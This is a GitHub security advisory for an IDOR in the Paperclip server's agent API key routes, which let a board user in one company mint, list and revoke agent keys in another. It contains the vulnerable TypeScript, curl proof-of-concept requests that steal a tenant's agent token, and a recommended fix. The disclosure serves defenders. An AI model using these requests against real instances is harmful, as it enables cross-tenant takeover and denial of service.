# [C] Paperclip: Cross-tenant agent API key IDOR in `/agents/:id/keys` routes allows full victim-company compromise

## Summary
Severity: Critical
Advisory: GHSA-3xx2-mqjm-hg9x
CWE: CWE-639
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-3xx2-mqjm-hg9x
Type: github-advisory

## Affected
- npm: `@paperclipai/server` — affected >=0 <2026.416.0

## Details
## Summary

The `GET`, `POST`, and `DELETE` handlers under `/agents/:id/keys` in the Paperclip control-plane API only call `assertBoard(req)`, which verifies that the caller has a board-type session but does not verify that the caller has access to the company owning the target agent. A board user whose membership is limited to Company A can therefore list, create, or revoke agent API keys for any agent in Company B by supplying the victim agent's UUID in the URL path. The `POST` handler returns the newly-minted token in cleartext, which authenticates subsequent requests as `{type:"agent", companyId:<CompanyB>}`, giving the attacker full agent-level access inside the victim tenant — a complete cross-tenant compromise.

## Details

The three vulnerable routes are defined in `server/src/routes/agents.ts:2050-2087`:

```ts
router.get("/agents/:id/keys", async (req, res) => {
  assertBoard(req);                       // <-- only checks actor.type === "board"
  const id = req.params.id as string;
  const keys = await svc.listKeys(id);
  res.json(keys);
});

router.post("/agents/:id/keys", validate(createAgentKeySchema), async (req, res) => {
  assertBoard(req);                       // <-- same
  const id = req.params.id as string;
  const key = await svc.createApiKey(id, req.body.name);
  // ... activity log ...
  res.status(201).json(key);              // returns cleartext `token`
});

router.delete("/agents/:id/keys/:keyId", async (req, res) => {
  assertBoard(req);                       // <-- same
  const keyId = req.params.keyId as string;
  const revoked = await svc.revokeKey(keyId);
  if (!revoked) { res.status(404).json({ error: "Key not found" }); return; }
  res.json({ ok: true });
});
```

`assertBoard` in `server/src/routes/authz.ts:4-8` is intentionally narrow:

```ts
export function assertBoard(req: Request) {
  if (req.actor.type !== "board") {
    throw forbidden("Board access required");
  }
}
```

It does **not** consult `req.actor.companyIds` or `req.actor.isInstanceAdmin`. Company-scoping is handled by a separate helper, `assertCompanyAccess(req, companyId)` (same file, lines 18-31), which the key-management routes never call.

The service layer is also unauthenticated. In `server/src/services/agents.ts:580-629`:

```ts
createApiKey: async (id: string, name: string) => {
  const existing = await getById(id);
  if (!existing) throw notFound("Agent not found");
  // ... status checks only ...
  const token = createToken();
  const keyHash = hashToken(token);
  const created = await db
    .insert(agentApiKeys)
    .values({
      agentId: id,
      companyId: existing.companyId,       // <-- copied from the victim agent
      name,
      keyHash,
    })
    .returning()
    .then((rows) => rows[0]);
  return { id: created.id, name: created.name, token, createdAt: created.createdAt };
},

listKeys: (id: string) => db.select({ ... }).from(agentApiKeys).where(eq(agentApiKeys.agentId, id)),

revokeKey: async (keyId: string) => {
  const rows = await db.update(agentApiKeys).set({ revokedAt: new Date() }).where(eq(agentApiKeys.id, keyId)).returning();
  return rows[0] ?? null;
},
```

Neither the agent id on `POST`/`GET` nor the key id on `DELETE` is cross-checked against the caller's company membership.

The returned token becomes a full-fledged agent actor in `server/src/middleware/auth.ts:151-169`:

```ts
req.actor = {
  type: "agent",
  agentId: key.agentId,
  companyId: key.companyId,      // <-- victim's company
  keyId: key.id,
  runId: runIdHeader || undefined,
  source: "agent_key",
};
```

`assertCompanyAccess` (lines 22-30 of `authz.ts`) only rejects an agent actor when `req.actor.companyId !== <target-companyId>`. Because the token the attacker just minted carries the victim's `companyId`, it sails through every company-access check in Company B — every endpoint that an agent in Company B is authorized to hit.

No router-level mitigation exists: `api.use(agentRoutes(db))` in `server/src/app.ts:155` mounts the router with only `boardMutationGuard` (which enforces read-only for some board sessions, not tenancy). The adjacent `POST /agents/:id/wakeup` route at line 2089 and `POST /agents/:id/heartbeat/invoke` at line 2139 correctly load the agent and call `assertCompanyAccess(req, agent.companyId)` — the key-management routes simply forgot this check. Commit `ac664df8` ("fix(authz): scope import, approvals, activity, and heartbeat routes") hardened several other routes in this same file family but did not touch the three key routes.

Agent UUIDs are routinely exposed to any authenticated board user through org-chart rendering, issue listings, heartbeat/activity payloads, and public references, so the "unguessable id" is not a practical barrier; further, the `DELETE` path only requires a `keyId`, which is returned by the equally-broken `GET /agents/:id/keys` for any target agent.

## PoC

Preconditions: attacker is a board user with membership only in Company A. They know (or learn via the listable agent surfaces) a UUID of an agent in Company B.

Step 1 — Authenticate as the Company-A board user and mint a key for a Company-B agent:

```bash
curl -sS -X POST https://target.example/api/agents/<VICTIM_COMPANY_B_AGENT_ID>/keys \
  -H 'Cookie: <attacker-board-session>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"pwn"}'
```

Expected (and observed) response:

```json
{"id":"<new-key-id>","name":"pwn","token":"<CLEARTEXT_AGENT_TOKEN>","createdAt":"2026-04-10T..."}
```

The server never consulted the attacker's `companyIds` — only the URL path — and returns the cleartext token whose `companyId` column is set to Company B's id.

Step 2 — Use the stolen agent token as a first-class agent principal in Company B:

```bash
curl -sS https://target.example/api/agents/<VICTIM_COMPANY_B_AGENT_ID> \
  -H 'Authorization: Bearer <CLEARTEXT_AGENT_TOKEN>'
```

`middleware/auth.ts` sets `req.actor = {type:"agent", agentId:<victim>, companyId:<CompanyB>, ...}`. Every route that does `assertCompanyAccess(req, <CompanyB>)` now passes.

Step 3 — The listing and revocation routes are broken in the same way:

```bash
# Enumerate every key on a victim agent (learn keyIds):
curl -sS https://target.example/api/agents/<VICTIM_COMPANY_B_AGENT_ID>/keys \
  -H 'Cookie: <attacker-board-session>'

# Revoke a legitimate Company-B key, denying service to the real operator:
curl -sS -X DELETE https://target.example/api/agents/<ANY_AGENT_ID>/keys/<VICTIM_KEY_ID> \
  -H 'Cookie: <attacker-board-session>'
```

`revokeKey` only matches on `keyId` (`server/src/services/agents.ts:622-629`), so even the `agentId` in the URL is decorative — the `keyId` alone is the authority.

## Impact

- **Full cross-tenant compromise.** Any board-authenticated user can mint agent API keys inside any other company in the same instance and then act as that agent — executing the workflows, reading the data, and calling every endpoint that agent is authorized for inside the victim tenant.
- **Listing leak.** Key metadata (ids, names, lastUsedAt, revokedAt) for every agent in every tenant is readable by any board user.
- **Cross-tenant denial of service.** The same primitive revokes legitimate agent keys in other companies by `keyId`.
- **Scope change.** The vulnerability is in Company A's scoping checks, but the impact is complete confidentiality/integrity/availability loss within Company B's tenant — a classic scope-change cross-tenant boundary breach.
- The attacker needs only the most minimal valid account on the instance (any company membership with board-type session) and a victim agent UUID, which is routinely exposed through agent listings, issues, heartbeats, and activity feeds.

## Recommended Fix

Require explicit company-access checks on all three routes before touching the service layer. For `POST`/`GET`, load the agent first and authorize against `agent.companyId`. For `DELETE`, load the key row first (or join through it) and authorize against `key.companyId` to avoid leaking via `keyId` guessing.

```ts
router.get("/agents/:id/keys", async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  const agent = await svc.getById(id);
  if (!agent) {
    res.status(404).json({ error: "Agent not found" });
    return;
  }
  assertCompanyAccess(req, agent.companyId);
  res.json(await svc.listKeys(id));
});

router.post("/agents/:id/keys", validate(createAgentKeySchema), async (req, res) => {
  assertBoard(req);
  const id = req.params.id as string;
  const agent = await svc.getById(id);
  if (!agent) {
    res.status(404).json({ error: "Agent not found" });
    return;
  }
  assertCompanyAccess(req, agent.companyId);
  const key = await svc.createApiKey(id, req.body.name);
  await logActivity(db, { /* ... */ });
  res.status(201).json(key);
});

router.delete("/agents/:id/keys/:keyId", async (req, res) => {
  assertBoard(req);
  const keyId = req.params.keyId as string;
  // Add a getKeyById(keyId) helper that returns { id, agentId, companyId }.
  const keyRow = await svc.getKeyById(keyId);
  if (!keyRow) {
    res.status(404).json({ error: "Key not found" });
    return;
  }
  assertCompanyAccess(req, keyRow.companyId);
  await svc.revokeKey(keyId);
  res.json({ ok: true });
});
```

Defense-in-depth: push the authorization down into the service layer as well, so any future caller (e.g. a new route, a job, or an RPC) is unable to create, list, or revoke an agent key without proving company access. Add regression tests mirroring the ones added in `ac664df8` for the sibling routes to pin the behavior.

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-3xx2-mqjm-hg9x
- https://github.com/paperclipai/paperclip
